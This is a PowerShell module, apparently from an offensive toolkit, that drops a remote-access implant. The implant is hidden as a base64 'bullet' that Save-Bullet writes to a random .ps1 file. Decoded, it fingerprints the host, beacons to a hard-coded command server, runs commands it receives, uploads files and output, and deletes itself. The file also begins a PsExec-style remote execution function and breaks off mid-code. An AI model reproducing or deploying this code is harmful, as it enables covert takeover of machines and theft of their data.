#region Helpers
function Out-Info([String] $theMsg) {
  try {
      if ($script:moduleLogFile) { Add-Content -path $script:moduleLogFile -value $theMsg }
      #elseif ($script:moduleDebug) { $theMsg | Out-Default }
      else { $theMsg }
  } catch {}
}

function Out-Debug($theMsg) {
  if ($script:moduleDebug) {
    Out-Info $theMsg
  }
}

function Get-PlatformInfo {
  $osName = [environment]::osVersion.versionString
  $osVersion = (Get-CimInstance Win32_OperatingSystem).Version
  $psVersion = $psversiontable.PSVersion.ToString()
  $dnetVersion = ([System.AppDomain]::CurrentDomain.GetAssemblies() |
    where-object { $_.FullName -like 'mscorlib*' } | 
    Select-Object ImageRuntimeVersion).ImageRuntimeVersion
  $_debugMode = ''
  if ($script:moduleDebug) { $_debugMode = 'Debug ON' }
  return `
      "$ModVer. Run as '$script:SessionUser'. $_debugMode`n" +
      "$osName / $osVersion / Powershell v${psVersion} / .Net ${dnetVersion}`n"
}

function Save-Bullet([String] $SavePath) {
  $bulletB64 = 'I3JlZ2lvbiBoZWxwZXIgZnVuY3Rpb25zDQpmdW5jdGlvbiBPdXQtRGVidWcoW1N0cmluZ10kdGhlTXNnKSB7DQogICAgdHJ5IHsNCiAgICAgICAgaWYgKCRXaXRoRGVidWcpIHsNCiAgICAgICAgICAgIGlmIChbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkTG9nRmlsZSkpIHsgIltERUJVR10gIiArICR0aGVNc2cgfCBPdXQtRGVmYXVsdCB9DQogICAgICAgICAgICBlbHNlIHsgIltERUJVR10gIiArICR0aGVNc2cgfCBBZGQtQ29udGVudCAkTG9nRmlsZSB9DQogICAgICAgfQ0KICAgIH0gY2F0Y2gge30NCn0NCmZ1bmN0aW9uIEdldC1CaW9zU2VyaWFsKCkgew0KICAgICRzbiA9ICJCSU9TIFVOS05PV04iDQogICAgJF9zbiA9ICIiDQogICAgdHJ5IHsNCiAgICAgICAgJG1TZWFyY2hlciA9IEdldC1XbWlPYmplY3QgLVF1ZXJ5ICJTRUxFQ1QgU2VyaWFsTnVtYmVyIEZST00gV2luMzJfQklPUyIgLWVhIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgaWYgKCRtU2VhcmNoZXIpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvIGluICRtU2VhcmNoZXIpIHsNCiAgICAgICAgICAgICAgICBpZiAoJG8uUHJvcGVydGllcy5OYW1lIC1lcSAiU2VyaWFsTnVtYmVyIikgew0KICAgICAgICAgICAgICAgICAgICAkX3NuID0gJG8uUHJvcGVydGllcy5WYWx1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7fQ0KICAgIGlmIChbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkX3NuKSAtZXEgJGZhbHNlKSB7ICRzbiA9ICRfc24gfQ0KICAgIHJldHVybiAiJHNuIjsNCn0NCmZ1bmN0aW9uIENvbnZlcnQtVG9CYXNlNjQoW3N0cmluZ10gJHRoZVNvdXJjZSkgew0KICAgIHJldHVybiBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkdGhlU291cmNlKSkNCn0NCmZ1bmN0aW9uIENvbnZlcnQtRnJvbUJhc2U2NChbc3RyaW5nXSAkdGhlU291cmNlKSB7DQogICAgcmV0dXJuIFtUZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCR0aGVTb3VyY2UpKQ0KfQ0KDQpmdW5jdGlvbiBDaGVjay1TZWNvbmRDb3B5KFtzdHJpbmddICR1bmlxdWVJZCkgew0KICAgICRzZWNvbmRDb3B5ID0gJGZhbHNlDQogICAgdHJ5IHsNCiAgICAgICAgJG51bGwgPSBbVGhyZWFkaW5nLlNlbWFwaG9yZV06Ok9wZW5FeGlzdGluZygkdW5pcXVlSWQpDQogICAgICAgICRzZWNvbmRDb3B5ID0gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgJHNjcmlwdDpTZW1hcGhvcmUgPSBOZXctT2JqZWN0IFRocmVhZGluZy5TZW1hcGhvcmUoMCwgMSwgJHVuaXF1ZUlkKQ0KICAgIH0NCiAgICByZXR1cm4gJHNlY29uZENvcHkNCn0NCiNlbmRyZWdpb24NCg0KI3JlZ2lvbiBDb25zb2xlIEV4Y2hhbmdlDQpGdW5jdGlvbiBTZW5kLVRvQ29uc29sZShbU3RyaW5nXSAkdGhlQW5zd2VyKSB7DQogICAgaWYgKFtTdHJpbmddOjpJc051bGxPckVtcHR5KCR0aGVBbnN3ZXIpKSB7IHJldHVybiB9DQoNCiAgICAkX3JjID0gIiINCiAgICB0cnkgew0KICAgICAgICAkX3djID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudA0KICAgICAgICAkX3djLlF1ZXJ5U3RyaW5nLkFkZCgiaWQiLCAkc2NyaXB0Om15SUQpDQogICAgICAgICRfd2MuSGVhZGVycy5BZGQoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L2h0bWwiKQ0KICAgICAgICAkX3djLkhlYWRlcnMuQWRkKCJBY2NlcHQiLCAidGV4dC9odG1sIikNCiAgICAgICAgJF9yYyA9ICRfd2MuVXBsb2FkU3RyaW5nKCR1cmxDb25zb2xlLCAkdGhlQW5zd2VyKQ0KDQogICAgICAgIE91dC1EZWJ1ZyAiUmVjaWV2ZWQgZnJvbSBjb25zb2xlOmBuJyQoJF9yYyknIg0KICAgICAgICByZXR1cm4gKCRfcmMsICIiKQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgICRfZXJyID0gJF8uVG9TdHJpbmcoKQ0KICAgICAgICBPdXQtRGVidWcgIkNvbnNvbGUgZXhjaGFuZ2UgZXJyb3I6YG4kKCRfZXJyKWBuSFRUUCBFcnJvcjogJCgkX3JjKSINCiAgICAgICAgcmV0dXJuICgiIiwgJF9lcnIpDQogICAgfQ0KfQ0KI2VuZHJlZ2lvbg0KDQojcmVnaW9uIEluaXRpYWxpemF0aW9uDQpmdW5jdGlvbiBSZW1vdmUtTXlzZWxmIHsNCiAgICBpZiAoJFJ1blBvcnRhYmxlKSB7IHJldHVybiB9DQogICAgJHByb2dGaWxlID0gJHNjcmlwdDpteUludm9jYXRpb24uTXlDb21tYW5kLlBhdGgNCiAgICBpZiAoKFRlc3QtUGF0aCAkcHJvZ0ZpbGUpIC1lcSAkdHJ1ZSkgew0KCSAgICBSZW1vdmUtSXRlbSAkcHJvZ0ZpbGUgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBJbml0LU15c2VsZiB7DQogICAgJF9vcyA9IEdldC1XbWlPYmplY3QgV2luMzJfT3BlcmF0aW5nU3lzdGVtIC1lYSBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKCRfb3MpIHsNCiAgICAgICAgJG15T1NWZXJzaW9uID0gJF9vcy5DYXB0aW9uICsgIiAiICsgJF9vcy5WZXJzaW9uDQogICAgfSBlbHNlIHsNCiAgICAgICAgJG15T1NWZXJzaW9uID0gJ09TIFVua25vd24gZHVlIHRvIFdNSSBlcnJvcicNCiAgICB9DQogICAgJG15VXNlck5hbWUgPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKS5OYW1lDQogICAgJG15SG9zdE5hbWUgPSAkX29zLkNTTmFtZQ0KDQogICAgJF9zbiA9IEdldC1CaW9zU2VyaWFsDQogICAgJF9pZCA9ICIkKCRteUhvc3ROYW1lKV8kKCRteVVzZXJOYW1lKV8kKCRfc24pXyQoJEdyb3VwSUQpIg0KICAgICRfaWQgPSBbUmVnZXhdOjpSZXBsYWNlKCRfaWQsICJbXmEtekEtWjAtOV0iLCAiIikNCiAgICAkaXNTZWNvbmRDb3B5ID0gQ2hlY2stU2Vjb25kQ29weSAkX2lkDQogICAgJHNjcmlwdDpteUlEID0gIiRfaWQtJCgkc2NyaXB0Om15VmVyKSINCg0KICAgICRteURvbWFpbiA9ICJIb3N0IGlzIG5vdCBhIG1lbWJlciBvZiBkb21haW4iDQogICAgJF9jcyA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtIC1lYSBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKCRfY3MpIHsNCiAgICAgICAgaWYgKCRfY3MuUGFydE9mRG9tYWluIC1lcSAkdHJ1ZSkgeyAkbXlEb21haW4gPSAkX2NzLkRvbWFpbiB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJG15RG9tYWluID0gJ0RvbWFpbiBVbmtub3duIGR1ZSB0byBXTUkgZXJyb3InDQogICAgfQ0KDQogICAgaWYgKCRpc1NlY29uZENvcHkpIHsNCiAgICAgICAgT3V0LURlYnVnICJJdCdzIGEgc2Vjb25kIGNvcHkuIFRlcm1pbmF0aW5nIg0KICAgICAgICBSZW1vdmUtTXlzZWxmDQogICAgICAgICMkX3N0YXJ0aW5mbyA9IChDb252ZXJ0LVRvQmFzZTY0ICJJTklUIikgKyAiYG4iICsgKENvbnZlcnQtVG9CYXNlNjQgIlNFQ09ORC1DT1BZIikNCiAgICAgICAgIygkX3Jlc3VsdCwgJF9lcnJvcikgPSBTZW5kLVRvQ29uc29sZSAkX3N0YXJ0aW5mbw0KICAgICAgICBbRW52aXJvbm1lbnRdOjpFeGl0KDEpDQogICAgfSBlbHNlIHsNCiAgICAgICAgT3V0LURlYnVnICJJdCdzIGEgZmlyc3QgY29weS4gU2VuZGluZyBpbml0aWFsIGluZm8iDQogICAgICAgICRfbG4xID0gKENvbnZlcnQtVG9CYXNlNjQgIklOSVQiKQ0KICAgICAgICAkX2xuMiA9IChDb252ZXJ0LVRvQmFzZTY0ICIkbXlPU1ZlcnNpb258JG15SG9zdE5hbWV8JG15RG9tYWlufCRteVVzZXJOYW1lfCRHcm91cElEIikNCiAgICAgICAgKCRfcmVzdWx0LCAkX2Vycm9yKSA9IFNlbmQtVG9Db25zb2xlICgkX2xuMSArICJgbiIgKyAkX2xuMikNCiAgICB9DQoNCiAgICBPdXQtRGVidWcgInZlci4kKCRzY3JpcHQ6bXlWZXIpIEluaXQgY29tcGxldGUiDQogICAgT3V0LURlYnVnICJ1cmxDb25zb2xlID0gJyR1cmxDb25zb2xlJyAgSW50ZXJ2YWwgPSAkSW50ZXJ2YWwgIFBvcnRhYmxlID0gJFJ1blBvcnRhYmxlICBOb1N3ZWVwID0gJE5vU3dlZXAgIFdpdGhEZWJ1ZyA9ICRXaXRoRGVidWcgIExvZ0ZpbGUgPSAnJExvZ0ZpbGUnICBHcm91cElEID0gJyRHcm91cElEJyINCn0NCiNlbmRyZWdpb24NCg0KI3JlZ2lvbiBUYXNrIENvbnRyb2wNCmZ1bmN0aW9uIFJ1bi1Db21tYW5kKFtTdHJpbmddICR0aGVDb25zb2xlQ21kKSB7DQogICAgIyB1bnBhY2sgY29uc29sZSBjb21tYW5kDQogICAgJF9jYyA9ICR0aGVDb25zb2xlQ21kLlNwbGl0KCJgbiIpDQogICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkX2NjLkxlbmd0aDsgJGkrKyApIHsNCiAgICAgICAgJF9jY1skaV0gPSBDb252ZXJ0LUZyb21CYXNlNjQoJF9jY1skaV0pDQogICAgfQ0KDQogICAgIyBleGVjdXRlIGNvbnNvbGUgY29tbWFuZA0KICAgICRfZGJnID0gIkNvbW1hbmQ6ICIgKyAkX2NjWzBdICsgIiBmb3I6ICIgKyAkX2NjWzFdDQogICAgT3V0LURlYnVnICRfZGJnDQogICAgc3dpdGNoICgkX2NjWzBdKSB7DQogICAgICAgICJTVE9QIiAgew0KICAgICAgICAgICAgR2V0LUpvYiB8ICUgeyBSZW1vdmUtSm9iIC1Kb2IgJF8gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAgICAgICRfbDEgPSBDb252ZXJ0LVRvQmFzZTY0KCJTVE9QQUNLIikNCiAgICAgICAgICAgIGlmICgkX2NjLkxlbmd0aCAtZ2UgMikgeyAkX2wyID0gQ29udmVydC1Ub0Jhc2U2NCgkX2NjWzFdKSB9DQogICAgICAgICAgICBlbHNlIHsgJF9sMiA9IENvbnZlcnQtVG9CYXNlNjQoIk5vdGhpbmciKSB9DQogICAgICAgICAgICAkX21zZyA9ICRfbDEsICRfbDIgLWpvaW4gImBuIg0KICAgICAgICAgICAgKCRfcmVzdWx0LCAkX2Vycm9yKSA9IFNlbmQtVG9Db25zb2xlICRfbXNnDQoNCiAgICAgICAgICAgICRrZXkgPSBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5S2V5XTo6T3BlbkJhc2VLZXkoW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeUhpdmVdOjpMb2NhbE1hY2hpbmUsIFtNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlWaWV3XTo6UmVnaXN0cnk2NCkNCiAgICAgICAgICAgICRzdWJLZXkgPSAgJGtleS5PcGVuU3ViS2V5KCJTT0ZUV0FSRVxNaWNyb3NvZnRcQ3J5cHRvZ3JhcGh5IikNCiAgICAgICAgICAgICRtR1VJRCA9ICRzdWJLZXkuR2V0VmFsdWUoIk1hY2hpbmVHdWlkIikNCiAgICAgICAgICAgICMgJG1HVUlEID0gKEdldC1JdGVtUHJvcGVydHkgSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XENyeXB0b2dyYXBoeSAnTWFjaGluZUd1aWQnKS5NYWNoaW5lR3VpZA0KICAgICAgICAgICAgJG1OYW1lID0gKFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygoTmV3LU9iamVjdCAtVHlwZU5hbWUgU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Lk1ENUNyeXB0b1NlcnZpY2VQcm92aWRlcikuQ29tcHV0ZUhhc2goKE5ldy1PYmplY3QgLVR5cGVOYW1lIFRleHQuVVRGOEVuY29kaW5nKS5HZXRCeXRlcygkbUdVSUQpKSkpLlJlcGxhY2UoIi0iLCIiKQ0KICAgICAgICAgICAgJG1VdGV4ID0gTmV3LU9iamVjdCBTeXN0ZW0uVGhyZWFkaW5nLk11dGV4KCRmYWxzZSwgIkdsb2JhbFwkbU5hbWUiKQ0KICAgICAgICAgICAgT3V0LURlYnVnICJFeGl0aW5nLiBNdXRleCBuYW1lOiAnR2xvYmFsXCRtTmFtZSciDQogICAgICAgICAgICBTdGFydC1TbGVlcCA1DQoNCiAgICAgICAgICAgIGV4aXQNCiAgICAgICAgfQ0KICAgICAgICAiS0lMTCIgIHsgDQogICAgICAgICAgICBpZiAoJF9jYy5MZW5ndGggLWx0IDIpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgICAgICAgICBSZW1vdmUtSm9iIC1OYW1lICRfY2NbMV0gLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAkX2wxID0gQ29udmVydC1Ub0Jhc2U2NCgiS0lMTEFDSyIpDQogICAgICAgICAgICAkX2wyID0gQ29udmVydC1Ub0Jhc2U2NCgkX2NjWzFdKQ0KICAgICAgICAgICAgJF9tc2cgPSAkX2wxLCAkX2wyIC1qb2luICJgbiINCiAgICAgICAgICAgICgkX3Jlc3VsdCwgJF9lcnJvcikgPSBTZW5kLVRvQ29uc29sZSAkX21zZw0KICAgICAgICAgICAgYnJlYWsgDQogICAgICAgIH0NCiAgICAgICAgIlJVTiIgICB7DQogICAgICAgICAgICBPdXQtRGVidWcgIk5ldyB0YXNrIE5hbWU6ICckKCRfY2NbMV0pJyINCiAgICAgICAgICAgIE91dC1EZWJ1ZyAiUnVubmluZyB0YXNrKHMpOiINCiAgICAgICAgICAgIEdldC1Kb2IgfCAlIHsgT3V0LURlYnVnICItICQoJF8uTmFtZSkifQ0KDQogICAgICAgICAgICBpZiAoJF9jYy5MZW5ndGggLWx0IDMpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgICAgICAgICAkX2V4aXN0cyA9IEdldC1Kb2IgLU5hbWUgJF9jY1sxXSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgaWYgKCRudWxsIC1lcSAkX2V4aXN0cykgew0KICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICRfY29kZSA9ICInU1RBUlRFRCdgbiIgKyAkX2NjWzJdDQogICAgICAgICAgICAgICAgICAgICRfc2MgPSBbc2NyaXB0YmxvY2tdOjpDcmVhdGUoJF9jb2RlKQ0KDQogICAgICAgICAgICAgICAgICAgIE91dC1EZWJ1ZyAiU3RhcnQgdGFzayB3aXRoIE5hbWU6ICQoJF9jY1sxXSkiDQoNCiAgICAgICAgICAgICAgICAgICAgJG51bGwgPSBTdGFydC1Kb2IgLU5hbWUgJF9jY1sxXSAtU2NyaXB0QmxvY2sgJF9zYw0KICAgICAgICAgICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgICAgICAgICAkX2wxID0gQ29udmVydC1Ub0Jhc2U2NCgiRkFJTEVEIikNCiAgICAgICAgICAgICAgICAgICAgJF9sMiA9IENvbnZlcnQtVG9CYXNlNjQoJF9jY1sxXSkNCiAgICAgICAgICAgICAgICAgICAgJF9sMyA9IENvbnZlcnQtVG9CYXNlNjQoIj09PT09U3RhcnQtSm9iIENyaXRpY2FsIEVycm9yPT09PT1gckV4Y2VwdGlvbjogIiArICRfLmV4Y2VwdGlvbi5tZXNzYWdlKQ0KICAgICAgICAgICAgICAgICAgICAkX21zZyA9ICRfbDEsICRfbDIsICRfbDMgLWpvaW4gImBuIg0KICAgICAgICAgICAgICAgICAgICAoJF9yZXN1bHQsICRfZXJyb3IpID0gU2VuZC1Ub0NvbnNvbGUgJF9tc2cNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCn0NCg0KZnVuY3Rpb24gR2V0LVRhc2tPdXRwdXQoJHRoZUpvYikgew0KICAgICRfb3V0ID0gJF93cm4gPSAkX2VyciA9ICIiDQogICAgdHJ5IHsNCiAgICAgICAgJGVycm9yLmNsZWFyKCkNCiAgICAgICAgJF9vdXQgPSAoUmVjZWl2ZS1Kb2IgLUpvYiAkdGhlSm9iIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1XYXJuaW5nQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBPdXQtU3RyaW5nKQ0KICAgICAgICAkX3dybiA9ICR0aGVKb2IuQ2hpbGRKb2JzWzBdLkVycm9yDQogICAgICAgICR0aGVKb2IuQ2hpbGRKb2JzWzBdLkVycm9yLkNsZWFyKCkNCg0KICAgICAgICB3aGlsZSAoJF9vdXQgLW1hdGNoICIoP20pLS0tLS0tRklMRTouK1xuPj4+KC4rKTw8PFxuLS0tLS0tRklMRUVORDouK1xuIikgew0KICAgICAgICAgICAgJGF0dEZpbGUgPSAkTWF0Y2hlc1sxXQ0KICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkYXR0RmlsZSkgew0KICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICRhdHRCb2R5ID0gW2lvLmZpbGVdOjpSZWFkQWxsQnl0ZXMoJGF0dEZpbGUpDQogICAgICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgICAgICRhdHRCb2R5ID0gW3RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJFcnJvcjogY2FuIG5vdCByZWFkIGF0dGFjaG1lbnQgZmlsZSAnJGF0dEZpbGUnYG4iICsgJF8uVG9TdHJpbmcoKSkNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gJGF0dEZpbGUgLUZvcmNlIC1lYSBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRhdHRCb2R5ID0gW3RleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJFcnJvcjogZmlsZSBkb2VzIG5vdCBleGlzdHMgJyRhdHRGaWxlJyIpDQogICAgICAgICAgICB9DQogICAgICAgICAgICAkX291dCA9ICRfb3V0LlJlcGxhY2UoIj4+PiQoJGF0dEZpbGUpPDw8IiwgW2NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkYXR0Qm9keSkpDQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICAkX2VyciA9ICRlcnJvclswXQ0KICAgICAgICAkZXJyb3IuQ2xlYXIoKQ0KICAgIH0NCg0KICAgIGlmICgkZmFsc2UgLWVxIFtTdHJpbmddOjpJc051bGxPckVtcHR5KCRfd3JuKSkgew0KICAgICAgICAkX291dCArPSAiYG49PT09PVdhcm5pbmdzOj09PT09YG4iICsgJF93cm4NCiAgICB9DQogICAgaWYgKCRmYWxzZSAtZXEgW1N0cmluZ106OklzTnVsbE9yRW1wdHkoJF9lcnIpKSB7DQogICAgICAgICRfb3V0ICs9ICJgbj09PT09PUVycm9yczo9PT09PT1gbiIgKyAkX2Vycg0KICAgIH0NCg0KICAgIHJldHVybiAkX291dA0KfQ0KDQpmdW5jdGlvbiBDaGVjay1UYXNrcyB7DQogICAgR2V0LUpvYiB8ICUgew0KICAgICAgICAkX2pvYiA9ICRfDQogICAgICAgIGlmICgiQ29tcGxldGVkIiwgIkZhaWxlZCIsICJTdG9wcGVkIiAtY29udGFpbnMgJF9qb2IuU3RhdGUpIHsNCiAgICAgICAgICAgICRfZGJnID0gIlN0YXR1czogIiArICRfam9iLlN0YXRlICsgIiBmb3I6ICIgKyAkX2pvYi5OYW1lDQogICAgICAgICAgICBPdXQtRGVidWcgJF9kYmcNCiAgICAgICAgICAgICRfdGFza091dCA9IEdldC1UYXNrT3V0cHV0ICRfam9iDQoNCiAgICAgICAgICAgICRfbDEgPSBDb252ZXJ0LVRvQmFzZTY0KCRfam9iLlN0YXRlLlRvU3RyaW5nKCkuVG9VcHBlcigpKQ0KICAgICAgICAgICAgJF9sMiA9IENvbnZlcnQtVG9CYXNlNjQoJF9qb2IuTmFtZSkNCiAgICAgICAgICAgICRfbDMgPSBDb252ZXJ0LVRvQmFzZTY0KCRfdGFza091dCkNCiAgICAgICAgICAgICRfbXNnID0gJF9sMSwgJF9sMiwgJF9sMyAtam9pbiAiYG4iDQogICAgICAgICAgICANCiAgICAgICAgICAgICgkX3Jlc3VsdCwgJF9lcnJvcikgPSBTZW5kLVRvQ29uc29sZSAkX21zZw0KICAgICAgICAgICAgUmVtb3ZlLUpvYiAtTmFtZSAkX2pvYi5OYW1lIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJF90YXNrT3V0ID0gR2V0LVRhc2tPdXRwdXQgJF9qb2INCiAgICAgICAgICAgIGlmIChbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkX3Rhc2tPdXQpKSB7IHJldHVybiB9DQoNCiAgICAgICAgICAgICRfZGJnID0gIlBBUlRJQUw6ICIgKyAkX2pvYi5TdGF0ZSArICIgZm9yOiAiICsgJF9qb2IuTmFtZQ0KICAgICAgICAgICAgT3V0LURlYnVnICRfZGJnDQogICAgICAgICAgICAkX2wxID0gQ29udmVydC1Ub0Jhc2U2NCgiUEFSVElBTCIpDQogICAgICAgICAgICAkX2wyID0gQ29udmVydC1Ub0Jhc2U2NCgkX2pvYi5OYW1lKQ0KICAgICAgICAgICAgJF9sMyA9IENvbnZlcnQtVG9CYXNlNjQoJF90YXNrT3V0KQ0KICAgICAgICAgICAgJF9tc2cgPSAkX2wxLCAkX2wyLCAkX2wzIC1qb2luICJgbiINCiAgICAgICAgICAgIA0KICAgICAgICAgICAgKCRfcmVzdWx0LCAkX2Vycm9yKSA9IFNlbmQtVG9Db25zb2xlICRfbXNnDQogICAgICAgIH0NCiAgICB9DQp9DQojZW5kcmVnaW9uDQoNCiMgLS0gcGFyYW1ldGVycyBwYXJzaW5nDQokc2NyaXB0Om15VmVyID0gIjAuMDIxYihTVkMpIg0KJExvZ0ZpbGUgPSAnJw0KJE5vU3dlZXAgPSAkdHJ1ZQ0KDQokV2l0aERlYnVnID0gJ2ZhbHNlJw0KaWYgKCRXaXRoRGVidWcgLWxpa2UgJyolREVCVUclKicpIHsgJFdpdGhEZWJ1ZyA9ICRmYWxzZSB9DQplbHNlIHsgJFdpdGhEZWJ1ZyA9IFtjb252ZXJ0XTo6VG9Cb29sZWFuKCRXaXRoRGVidWcpIH0NCg0KJHVybENvbnNvbGUgPSAiaHR0cHM6Ly9iZXN0c2VjdXJlMjAyMC5jb20vZ2F0ZSINCmlmICgkdXJsQ29uc29sZSAtbGlrZSAnKiVVUkwlKicpIHsNCiAgICBPdXQtRGVidWcgIk1vZHVsZSBpcyB1bmluaXRpYWxpemVkOiB1cmxDb25zb2xlIGlzICckdXJsQ29uc29sZSciDQogICAgZXhpdA0KfQ0KDQokUnVuUG9ydGFibGUgPSAnZmFsc2UnDQppZiAoJFJ1blBvcnRhYmxlIC1saWtlICcqJVBPUlRBQkxFJSonKSB7ICRSdW5Qb3J0YWJsZSA9ICRmYWxzZSB9DQplbHNlIHsgJFJ1blBvcnRhYmxlID0gW2NvbnZlcnRdOjpUb0Jvb2xlYW4oJFJ1blBvcnRhYmxlKSB9DQoNCiRJbnRlcnZhbCA9ICc2MCcNCmlmICgkSW50ZXJ2YWwgLWxpa2UgJyolSU5URVJWQUwlKicpIHsgJEludGVydmFsID0gNjAgfQ0KZWxzZSB7ICRJbnRlcnZhbCA9IFtjb252ZXJ0XTo6VG9JbnQzMigkSW50ZXJ2YWwpIH0NCg0KJEdyb3VwSUQgPSAnNGFVZEJONEpKUycNCmlmICgkR3JvdXBJRCAtbGlrZSAnKiVHUk9VUCUqJykgeyAkR3JvdXBJRCA9ICcnIH0NCg0KJHNjcmlwdDpXYXJuaW5nUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIg0KJHNjcmlwdDpWZXJib3NlUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIg0KW1RocmVhZGluZy5TZW1hcGhvcmVdICRzY3JpcHQ6U2VtYXBob3JlID0gJG51bGwNCiRfZGViQ250ID0gMA0KDQojIC0tIGluaXRpYWxpemF0aW9uDQpJbml0LU15c2VsZg0KaWYgKC1ub3QgJE5vU3dlZXApIHsgUmVtb3ZlLU15c2VsZiB9DQoNCiMgLS0gU3RhcnQNCndoaWxlICgkdHJ1ZSkgew0KICAgICRfbmV4dFN0YXJ0ID0gKEdldC1EYXRlKS5BZGRTZWNvbmRzKCRJbnRlcnZhbCkNCg0KICAgICMgcXVlcnkgY29uc29sZSBmb3Igam9iDQogICAgJF90bCA9ICAiIg0KICAgIEdldC1Kb2IgfCAlIHsgJF90bCArPSAkXy5OYW1lICsgInwiIH0NCiAgICAkX3RsID0gJF90bC5UcmltRW5kKCJ8IikNCg0KICAgICRfZGViQ250ICs9IDENCiAgICBpZiAoJF9kZWJDbnQgJSAxMDAgLWVxIDEpIHsNCiAgICAgICAgJF9kYmcgPSAiUVVFUlkgQ29uc29sZSAoTG9vcCMkX2RlYkNudCkuIFRhc2tMaXN0OiAiICsgJF90bA0KICAgICAgICBPdXQtRGVidWcgJF9kYmcNCiAgICB9DQoNCiAgICAkX3F1ZXJ5ID0gKENvbnZlcnQtVG9CYXNlNjQgIlFVRVJZIikgKyAiYG4iICsgKENvbnZlcnQtVG9CYXNlNjQgJF90bCkNCiAgICAoJF90YXNrLCAkX2VycikgPSBTZW5kLVRvQ29uc29sZSAkX3F1ZXJ5DQogICAgaWYgKChbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkX2VycikgLWVxICR0cnVlKSAtYW5kIChbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkX3Rhc2spIC1lcSAkZmFsc2UpKSB7IA0KICAgICAgICBSdW4tQ29tbWFuZCAkX3Rhc2sNCiAgICB9DQoNCiAgICBPdXQtRGVidWcgIk5leHQgbG9vcCBhdCAkKCRfbmV4dFN0YXJ0LlRvU3RyaW5nKCkpIg0KICAgIHdoaWxlICgoR2V0LURhdGUpIC1sZSAkX25leHRTdGFydCkgew0KICAgICAgICBTdGFydC1TbGVlcCAtc2VjIDENCiAgICAgICAgQ2hlY2stVGFza3MNCiAgICB9DQp9DQo='
  $bulletText = [Text.Encoding]::UTF8.GetString([convert]::FromBase64String($bulletB64))

  if ((Test-Path -path $SavePath) -eq $false) {
      throw "Can not save bullet. Directory '$SavePath' does not exists"
  }
  $bulletFile = [System.IO.Path]::GetRandomFileName() + '.ps1'
  $bulletFile = Join-Path $SavePath $bulletFile
  [Io.File]::WriteAllText($bulletFile, $bulletText)
  return $bulletFile
}

function Clear-Bullet([String] $BulletFile) {
  try {
    Remove-Item $BulletFile -Force -ea SilentlyContinue
  } catch {}
}
#endregion

function Invoke-PsExec {
  [CmdletBinding()]
  param(
    [string] $ComputerName,
    [string] $BulletFile,
    [string] $ServiceName,
    [switch] $NoCleanup
  )
}

  # ??  $ErrorActionPreference = "Stop"

  function Local:Get-RandomString ([int]$Length = 12) {
    $set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
    $result = ""
    for ($x = 0; $x -lt $Length; $x++) {
      $result += $set | Get-Random
